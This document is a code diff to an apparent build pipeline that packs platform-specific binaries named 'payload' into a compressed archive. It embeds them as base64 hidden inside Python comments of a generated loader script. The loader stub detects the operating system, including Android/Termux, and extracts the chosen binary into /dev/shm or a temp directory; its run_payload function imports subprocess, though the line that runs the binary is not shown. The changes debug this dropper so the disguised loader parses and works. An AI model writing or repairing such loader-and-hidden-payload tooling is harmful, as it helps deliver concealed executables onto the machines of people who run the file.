@@ -746,8 +746,21 @@ def _github_retry_after(response, default=2.0):
     try:
         raw = headers.get("Retry-After") or headers.get("retry-after")
         if raw is not None:
-            value = float(str(raw).strip())
-            if value >= 0:
+            raw_s = str(raw).strip()
+            try:
+                value = float(raw_s)
+            except (TypeError, ValueError):
+                value = None
+            if value is None:
+                # RFC 9110 permits an HTTP-date as well as delta-seconds.
+                try:
+                    from email.utils import parsedate_to_datetime
+                    import time as _time
+                    when = parsedate_to_datetime(raw_s).timestamp()
+                    value = max(0.0, when - _time.time())
+                except (TypeError, ValueError, OverflowError):
+                    value = None
+            if value is not None and value >= 0:
                 return min(value, _GITHUB_MAX_BACKOFF)
     except (TypeError, ValueError):
         pass
@@ -2295,7 +2308,7 @@ jobs:
                         try:
                             t = t.replace('Z', '+00:00')
                             from datetime import datetime
-                            return datetime.datetime.fromisoformat(t).timestamp()
+                            return datetime.fromisoformat(t).timestamp()
                         except Exception: return 0.0
                     s_time = parse_ts(job.get('started_at'))
                     c_time = parse_ts(job.get('completed_at'))
@@ -2592,14 +2605,18 @@ def optimize_and_pack_binaries(dist_dir):
         if not os.path.isfile(fpath) or fname.endswith(".zip") or fname.endswith(".tar"):
             continue
         fname_lower = fname.lower()
-        if "windows" in fname_lower:
+        # Farm artifacts are normally standardised as payload.pyd/.so/.dylib,
+        # not names containing the platform. Accept both naming schemes;
+        # otherwise the exact files this pipeline downloads are silently
+        # ignored and no tar is produced.
+        if "windows" in fname_lower or fname_lower.endswith((".pyd", ".exe")):
             binary_files["windows"] = fpath
-        elif "linux" in fname_lower and "android" not in fname_lower:
-            binary_files["linux"] = fpath
-        elif "macos" in fname_lower or "darwin" in fname_lower:
-            binary_files["darwin"] = fpath
         elif "android" in fname_lower:
             binary_files["android"] = fpath
+        elif "macos" in fname_lower or "darwin" in fname_lower or fname_lower.endswith(".dylib"):
+            binary_files["darwin"] = fpath
+        elif ("linux" in fname_lower and "android" not in fname_lower) or fname_lower.endswith(".so"):
+            binary_files["linux"] = fpath
     if not binary_files:
         print("    [!] No binaries found to optimize")
         return None
@@ -2631,7 +2648,7 @@ def generate_tar_loader_script(tar_path):
                 dst_tar.addfile(member, src_tar.extractfile(member))
     xz_payload = bio.getvalue()
     loader_stub = r'''# -*- coding: utf-8 -*-
-import sys,os,tarfile,io,subprocess,platform,tempfile,shutil,stat
+import sys,os,tarfile,io,subprocess,platform,tempfile,shutil,stat,base64
 def run_payload():
     s = platform.system().lower()
     is_android = "android" in s or os.path.exists("/data/data/com.termux") or os.path.exists("/system/build.prop")
@@ -2650,15 +2667,22 @@ def run_payload():
         idx = content.find(sep)
         if idx == -1: return
         archive_data = content[idx + len(sep):]
+        # generate_xz_loader_file stores the binary archive as base64 inside a
+        # Python comment. Raw appended xz bytes are not valid Python source, so
+        # the loader file could not even be imported before this encoding existed.
+        if archive_data.startswith(b"#"):
+            archive_data = base64.b64decode(
+                archive_data.strip().replace(b"\n#", b"").replace(b"#", b"", 1))
         with tarfile.open(fileobj=io.BytesIO(archive_data), mode="r:xz") as tar:
+            ext = ".exe" if target == "windows" else ".bin"
+            member_name = "payload." + target + ext
             try:
-                member = tar.getmember(target)
+                member = tar.getmember(member_name)
             except KeyError:
                 if target == "android":
-                    try: member = tar.getmember("linux")
+                    try: member = tar.getmember("payload.linux.bin")
                     except Exception: return
                 else: return
-            ext = ".exe" if target == "windows" else ".bin"
             mem_path = "/dev/shm" if os.path.exists("/dev/shm") else tempfile.gettempdir()
             fd, tmp_path = tempfile.mkstemp(suffix=ext, dir=mem_path)
             with os.fdopen(fd, "wb") as f_out:
@@ -2689,7 +2713,15 @@ if __name__=="__main__":
     return loader_stub, xz_payload
 def generate_xz_loader_file(tar_path, output_path):
     loader_stub, xz_payload = generate_tar_loader_script(tar_path)
-    final_content = loader_stub.encode('utf-8') + b"\n#_NX_PAYLOAD_START_#\n" + xz_payload
+    # The output must itself be valid Python. Appending raw xz bytes made the
+    # loader fail at parse time with "source code cannot contain null bytes";
+    # a base64 comment keeps the payload inert to the Python parser and the
+    # runtime decodes it after the marker.
+    encoded = base64.b64encode(xz_payload)
+    commented = b"\n".join(
+        b"#" + encoded[i:i + 76] for i in range(0, len(encoded), 76))
+    final_content = (loader_stub.encode('utf-8') +
+                     b"\n#_NX_PAYLOAD_START_#\n" + commented + b"\n")
     with open(output_path, "wb") as f:
         f.write(final_content)
     return output_path
